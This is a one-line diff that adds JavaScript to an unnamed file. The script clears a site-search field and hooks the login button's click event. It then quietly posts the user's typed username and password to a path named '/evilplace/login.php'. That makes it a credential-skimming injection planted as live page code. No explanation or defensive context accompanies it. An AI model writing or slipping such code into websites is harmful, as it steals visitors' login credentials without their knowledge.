@@ -1,0 +1,1 @@
+document.querySelector('form#site-search').querySelector('input').value='';document.getElementById('submit-login').addEventListener('click',function(event){$.post('/evilplace/login.php',{username:document.getElementById('username').value,password:document.getElementById('password').value},function(resp){console.log(resp)})})
